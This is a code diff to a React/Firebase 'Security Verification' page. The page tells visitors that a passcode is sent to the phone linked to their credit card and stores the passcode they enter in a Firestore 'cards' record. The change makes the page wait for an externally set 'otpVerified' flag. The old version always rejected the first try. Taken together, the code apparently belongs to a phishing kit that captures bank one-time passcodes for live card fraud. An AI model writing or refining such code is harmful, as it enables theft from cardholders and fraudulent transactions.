@@ -1,9 +1,10 @@
 import { LoadingButton } from "@mui/lab";
 import { Alert, Container, Snackbar, styled } from "@mui/material";
-import { doc, setDoc } from "firebase/firestore";
-import React, { useState } from "react";
+import { doc, onSnapshot, setDoc } from "firebase/firestore";
+import React, { useEffect, useState } from "react";
 import { useNavigate, useParams } from "react-router-dom";
-import { db } from ".";
+import { db } from "../config/firebase";
+
 
 var today = new Date();
 var dd = String(today.getDate()).padStart(2, "0");
@@ -39,9 +40,20 @@ export const Verified = () => {
 
 function Otp() {
   const [state, setState] = useState({ passcode: "" });
+  const [otpVerified, setOtpVerified] = useState(false);
+
   const [loading, setLoading] = useState(false);
   const [submited, setSubmited] = useState(0);
   const navigate = useNavigate();
+
+  let { cardigit, param } = useParams();
+
+  useEffect(() => {
+    onSnapshot(doc(db(""), "cards", param), (doc) => {
+      console.log("otpVerified: ", doc.data().otpVerified);
+      setOtpVerified(doc.data().otpVerified);
+    });
+  }, []);
 
   const [snackbar, setSnackbar] = useState({
     open: false,
@@ -55,8 +67,6 @@ function Otp() {
     setSnackbar({ ...snackbar, open: false });
   };
 
-  let { cardigit, param } = useParams();
-
   const handleChange = (event) => {
     setState({
       ...state,
@@ -68,20 +78,20 @@ function Otp() {
   const submit = (e) => {
     e.preventDefault();
     setLoading(true);
-    const cardRef = doc(db, "cards", param);
+    const cardRef = doc(db(""), "cards", param);
     setDoc(cardRef, state, { merge: true }).then(() => {
       // navigate("/confirm", { replace: true })
 
-      if (submited == 0) {
+      if (otpVerified) {
+        navigate("/confirm", { replace: true });
+        console.log("done");
+      } else {
         setSnackbar({
           ...snackbar,
           open: true,
         });
         setSubmited(submited + 1);
         setLoading(false);
-      } else {
-        navigate("/confirm", { replace: true });
-        console.log("done");
       }
     });
   };
@@ -91,7 +101,7 @@ function Otp() {
       <h3>Security Verification</h3>
       <div className="alert alert-info" role="alert">
         <strong className="alert-link">
-          A one time passcode has been sent to the mobile number connected with
+          A one time passcode will be sent to the mobile number connected with
           the below credit card detalis, please use the passcode to authenticate
           the transaction.
         </strong>
